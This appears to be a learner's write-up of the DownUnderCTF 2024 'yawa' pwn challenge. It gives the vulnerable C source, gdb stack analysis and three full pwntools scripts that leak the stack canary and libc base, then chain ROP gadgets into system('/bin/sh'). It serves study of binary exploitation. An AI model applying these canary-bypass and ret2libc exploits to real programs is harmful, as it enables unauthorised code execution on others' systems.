
#source-code #author-solution #alt-solution #my-solution

#### tools & techniques:
[[libc database]]
[[Ropper]] 
[[gdb-pwndbg]]
[[Find base of libc]]
[[Bypassing canary]]
#### welcome note
 >Yet another welcome application


### Reflection

This was an interesting challenge to look at and as a beginner challenge, I quickly saw the vulnerability that was a buffer overflow after setting declaration of a char array `char name[88];` which allows `read(0, name, 0x8);` (136 bytes) to be read. Unfortunately so far I've not looked at bypassing stack canaries so was unable to move much further on this challenge so this writeup will be an analysis of the writeup script given by the author and experimentation of how this canary is bypassed.
## intro

We get three files and a command to connect:

`nc 2024.ductf.dev 30010`

`yawa.c`
`yawa`
`libc.so.6`
`ld-linux-x86-64.s0.2`

#### protections
`RELRO           STACK CANARY      NX            PIE                Symbols      
`Full RELRO      Canary found      NX enabled    PIE enabled        45 Symbols          

#### file info
`└─$ file yawa
`yawa: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7f7b72aaab967245353b6816808804a6c4ad2168, not stripped



Connecting to the server gives:

```
┌──(kali㉿kali)-[~/Documents/Down Under CTF 24/pwn/yawa]
└─$ nc 2024.ductf.dev 30010
1. Tell me your name
2. Get a personalised greeting
> 1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
1. Tell me your name
2. Get a personalised greeting
> 2
Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
7��}
1. Tell me your name
2. Get a personalised greeting
> 
```


### writeup

#### Part 1: leaking the canary
After entering a few spurious inputs and getting my personalised greeting, i could see that something was being leaked presumably from the stack. Unfortunately, I couldn't get any further in this challenge. I found that entering too many characters resulted in the `menu()` function being called repeatedly with no further input being able. 

Looking at the exploit script given by the author, after filling the char array and adding one extra char, the value leaked seems to be the canary based on this code:
```
r = rl()
canary = uu64(r[-9:-2]) << 8
```


Now to go through GDB and look for that value. After quickly looking up a about where the canary value is stored, it seems to be immediately before the RBP:
```
02:0010│ rsi 0x7fffffffdd00 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓        10 skipped
0d:0068│-008 0x7fffffffdd58 ◂— 0x7026f648863db40a
0e:0070│ rbp 0x7fffffffdd60 ◂— 1
0f:0078│+008 0x7fffffffdd68 —▸ 0x7ffff7c29d90 ◂— mov edi, eax
```

The canary above must be the value before [See this great ctf resource](https://book.jorianwoltjer.com/binary-exploitation/stack-canaries) so above the canary must be at `0x7ffffffffdd58` and and as above, be `0x7026f648863db40a

Interestingly, gdb finds the canary as`00:0000│  0x7fffffffba48 ◂— 0x7026f648863db400` which includes the null byte not present in ours. This explains why this null byte can be overwritten and the value of the canary is unchanged but this throws up the question, why is the canary leaked when we call the 'get personalised greeting' option from the yawa program.

  ```                                       
#!usr/bin/env python3
from pwn import *
context.log_level = 'debug'
exe = ELF("./yawa")
# libc = ELF("./libc.so.6")

io = process([exe.path])
io.sendlineafter(b'>', b'1')
io.sendline(b'a' * 89)
io.sendlineafter(b'>', b'2')
print(io.recvline()) 
r = io.recvline() 
print(r)
canary = u64(r.ljust(8, b'\x00')) << 8
print("Canary: ", hex(canary))

output: 'Canary:  0xa01cf866894234b00'
```


Rewriting the script is working so far, but understanding why the printf() function is outputting the canary too takes a little working out. It seems like it's to do with the fact the read() function allows too many chars to be input, and assigns 88 of them to the char array buffer. It's a puzzling interaction as it seems as though the `read(0, name, 0x88);` function should take the input and allocate it to the char array `char name[88]` and then the statement `printf("Hello, %s\n", name);` should read the `name[]` char array which has a length of 88 bytes. Why instead does the format string print the contents of the `read()` function instead?

Studying the documentation on [char sequences](https://cplusplus.com/doc/tutorial/ntcs/) shows that they are null terminated. I assume that the fact the read() function allows more than the length of the buffer means that if the char sequences never receives it's null character, then it will allow input until it does. This seems to work out as if I fill the buffer with 88 chars, it leaks the canary however if i only enter 87, it doesn't.

#todo - learn more about this!

#### Part 2: leaking libc_base

The next step is leaking the libc base address. The author of the script does this by sending 104 chars to the input and calling the 2nd option to view the personalised greeting. Let's try that manually and see what the stack looks like.

inputting 'y' * 104:

```
02:0010│ rsi 0x7fffffffdd00 ◂— 0x7979797979797979 ('yyyyyyyy')
... ↓        12 skipped
0f:0078│+008 0x7fffffffdd68 —▸ 0x7ffff7c29d0a ◂— add byte ptr [rax], al
```
This looks like we've overflowed everything up to the return address.

I used the following to get the address of 'system' which i could then plug into a [[libc database]] 
`base = libc.symbols['system']  
`print(hex(base))

`output: 0x50d70

This shows:
`__libc_start_main_ret	0x29d90

So the offset must be `0x29d90`


#todo The authors solution doesn't clearly explain another method of finding this offset so more knowledge needed. If i don't have access to the libc then how do i do this? Both solutions have it hard coded in - maybe it's this? `0x7ffff7c**29d90**`

`─$ ldd yawa                                             
  `linux-vdso.so.1 (0x00007ffff7fc9000)
  `libc.so.6 => ./libc.so.6 (0x00007ffff7c00000)
`./ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)

`└─$ readelf -s ./libc.so.6 | grep "system"
  `1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5

Offset from Base of libc to system: `0x50d70`

#### method to [[Find base of libc]]:
So if we leak a function from the libc library, e.g puts, `grep "puts"` and work out how far from base of binary. Then subtract that from address leaked, we have the address of the base of the binary.



### Part 3: finding gadgets
I couldn't find a pop_rdi gadget using ropper so not sure where the author got the address of that gadget however the alt_solve.py script uses ropstar(I think that's what it's called?) to find them.

```
rop = ROP(libc)
rop.raw(b"A" * 88)
rop.raw(canary)
rop.raw(p64(0)) # saved rbp
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
p.send(rop.chain())
```

The code is self explanatory and worked nicely when added to my script:







 



### Source code for the program:
#source-code
```
  GNU nano 7.2                                           yawa.c                                                    
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
}

int menu() {
    int choice;
    puts("1. Tell me your name");
    puts("2. Get a personalised greeting");
    printf("> ");
    scanf("%d", &choice);
    return choice;
}

int main() {
    init();

    char name[88];
    int choice;

    while(1) {
        choice = menu();
        if(choice == 1) {
            read(0, name, 0x88);
        } else if(choice == 2) {
            printf("Hello, %s\n", name);
        } else {
            break;
        }
    }
}

```



## solutions

#my-solution

```
#!/usr/bin/env python3

from pwn import *
import struct
# context.log_level = 'debug'

exe = ELF("./yawa", checksec=False)
context.binary = exe

libc = ELF("./libc.so.6", checksec=False)

io = exe.process()

io.sendlineafter(b'>', b'1')
io.send(b'a' * 89)
io.sendlineafter(b'>', b'2')
r = io.recvline()
canary = u64(r[-9:-2].ljust(8, b'\x00')) << 8
print("Canary: ", hex(canary))

MAIN_RETURN_ADDRESS = 0x29d90
# find libc base address
io.sendlineafter(b'>', b'1')
io.send(b'y' * 104)
io.sendlineafter(b'>', b'2')
r = io.recvline() 
libc_base = u64(r[-7:-1].ljust(8, b'\x00')) - MAIN_RETURN_ADDRESS

# Set base address
libc.address = libc_base
print("LIBC", hex(libc.address))
print(type(libc.address))

# get address of ret gadget, pop rdi gadget, '/bin/sh' string and system function
io.sendlineafter(b'>', b'1')
rop = ROP(libc)
rop.raw(b'a' * 88)
rop.raw(canary)
rop.raw(p64(0))
rop.rdi = p64(next(libc.search(b'/bin/sh\x00')))
rop.raw(p64(rop.find_gadget(['ret']).address))
rop.call('system')
io.send(rop.chain())

io.sendlineafter(b'>', b'3')
io.sendline(b'cat flag.txt')

print(io.readline().decode())
```

#author-solution

```
from pwn import **
context.log_level = 'debug'
if os.getenv('RUNNING_IN_DOCKER'):
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h', '-p', '75']
else:
    gdb.binary = lambda: 'gef'
    context.terminal = ['alacritty', '-e', 'zsh', '-c']

sla  = lambda r, s: conn.sendlineafter(r, s)
sl   = lambda    s: conn.sendline(s)
sa   = lambda r, s: conn.sendafter(r, s)
se   = lambda s: conn.send(s)
ru   = lambda r, **kwargs: conn.recvuntil(r, **kwargs)
rl   = lambda : conn.recvline()
uu32 = lambda d: u32(d.ljust(4, b'\x00'))
uu64 = lambda d: u64(d.ljust(8, b'\x00'))

exe = ELF("./yawa_patched")
libc = ELF("./libc.so.6")

# conn = process([exe.path])
conn = remote('0.0.0.0', 1337)

sla(b'> ', b'1')
se(b'x' * 89)
sla(b'> ', b'2')
r = rl()
canary = uu64(r[-9:-2]) << 8
print('canary:', hex(canary))

sla(b'> ', b'1')
se(b'y' * 104)
sla(b'> ', b'2')
r = rl()
libc_base = uu64(r[-7:-1]) - 0x29d90
print('libc:', hex(libc_base))

libc.address = libc_base
ret = libc_base + 0x1bc065
pop_rdi = libc_base + 0x1bbea1
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

sla(b'> ', b'1')
se(b''.join([
    b'y' * 88,
    p64(canary),
    p64(0),
    p64(ret),
    p64(pop_rdi),
    p64(bin_sh),
    p64(system)
]))
sla(b'> ', b'3')

conn.interactive()
```


#alt-solution
```
#!/usr/bin/env python3

from pwn import *
import struct

#context.log_level = "debug"
elf = ELF("./yawa_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("2024.ductf.dev", 30010)

p.sendlineafter(b"> ", b"1") # leak canary
p.send(b"A" * 89)
p.sendlineafter(b"> ", b"2")
p.recv(88 + 7 + 1)
canary = b"\x00" + p.recv(7)
log.success(f"canary: {canary.hex()}")

MAIN_RETURN_ADDRESS = 0x29d90 # where, in libc.so.6, main should return to

p.sendlineafter(b"> ", b"1") # leak return address
p.send(b"A" * 0x68)
p.sendlineafter(b"> ", b"2")
p.recv(0x68 + 7)
leak = struct.unpack("<Q", p.recv(6) + b"\x00\x00")[0]
libc.address = leak - MAIN_RETURN_ADDRESS
log.success(f"libc: {hex(libc.address)}")

p.sendlineafter(b"> ", b"1") # set return address to system("/bin/sh")
rop = ROP(libc)
rop.raw(b"A" * 88)
rop.raw(canary)
rop.raw(p64(0)) # saved rbp
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
p.send(rop.chain())

p.sendlineafter(b"> ", b"3") # return from main

p.sendline(b"cat flag.txt")

print(p.readline().decode()) # DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}
```